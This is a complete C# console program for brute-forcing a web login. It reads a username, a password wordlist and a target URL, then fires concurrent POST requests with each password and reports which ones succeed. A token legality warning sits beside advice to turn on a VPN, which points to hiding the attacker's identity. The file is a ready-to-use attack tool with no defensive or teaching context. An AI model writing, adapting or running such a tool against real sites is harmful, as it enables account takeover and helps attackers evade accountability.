using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        ServicePointManager.DefaultConnectionLimit = 100;
        Console.WriteLine("Write the UserName(Login) =>");

        string username = Console.ReadLine(); // user 

        Console.WriteLine("Provide the full path to the wordlist file in your folder =>");

        string passwordListFile = Console.ReadLine();
        Console.WriteLine("Enter the desired URL =>");
        string url = Console.ReadLine(); // enter your url

        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine("WARNING!");
        Console.WriteLine("Unauthorized brute force attacks are illegal and can result in severe consequences!!!");
        Console.WriteLine("don't forget to activate the VPN");
        Console.ResetColor();

        Console.ForegroundColor = ConsoleColor.DarkYellow;
        Console.WriteLine("Do you want to continue?");
        Console.WriteLine();
        Console.ResetColor();

        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine("1.Yes");
        Console.ResetColor();

        Console.ForegroundColor = ConsoleColor.DarkGreen;
        Console.WriteLine("2.No");
        Console.ResetColor();
        string input = Console.ReadLine();

        switch (input.ToLower())
        {
            case "1":
            case "yes":
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("...");
                Console.ResetColor();
                try
                {
                    var passwords = System.IO.File.ReadAllLines(passwordListFile);

                    using (var httpClient = new HttpClient())
                    {
                        List<Task> tasks = new List<Task>();

                        foreach (string password in passwords)
                        {
                            tasks.Add(Task.Run(async () =>
                            {
                                var formData = new FormUrlEncodedContent(new[]
                                {
                            new KeyValuePair<string, string>("username", username),
                            new KeyValuePair<string, string>("password", password)
                        });

                                HttpResponseMessage response = await httpClient.PostAsync(url, formData);

                                if (response.IsSuccessStatusCode)
                                {
                                    Console.WriteLine($"Login successful with password: {password}");
                                }
                                else
                                {
                                    Console.WriteLine($"Failed with password: {password}");
                                }
                            }));
                        }

                        await Task.WhenAll(tasks);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                }
                break;
            case "2":
            case "no":
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine("Goodbye");
                Console.ResetColor();
                break;
        }



    }
}
